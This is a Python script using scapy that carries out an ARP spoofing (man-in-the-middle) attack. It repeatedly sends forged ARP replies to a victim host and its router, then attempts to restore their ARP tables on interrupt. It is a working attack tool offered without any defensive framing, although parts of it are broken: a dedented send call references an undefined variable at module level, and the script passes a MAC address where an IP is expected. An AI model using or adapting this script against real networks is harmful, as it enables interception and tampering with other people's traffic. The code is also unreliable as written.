from scapy.all import *
import sys

def arp_spoof(dest_ip, dest_mac, source_ip):
    if not dest_ip or not dest_mac or not source_ip:
        print("error: missing arguments.")
        return

    try:
        my_mac = getmacbyip(get_if_hwaddr(conf.iface))
        arp_package = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=my_mac)
        send(arp_package, verbose=False)
        print(f"ARP-package is send.  IP: {source_ip}, MAC: {my_mac}  -->  IP: {dest_ip}, MAC: {dest_mac}")

    except Exception as e:
        print(f"error while sending ARP-package: {e}")
def arp_restore(dest_ip, dest_mac, source_ip, source_mac): 
    packet= ARP(op="is-at", hwsrc=source_mac, 
                    psrc= source_ip, hwdst= dest_mac , pdst= dest_ip)
send(packet, verbose=False) 

def main():
    victim_ip= sys.argv[1]
    router_ip= sys.argv[2]
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)
    try:
        print("Sending spoofed ARP packets")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
    except KeyboardInterrupt:
        print("Restoring ARP Tables")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        quit()

main()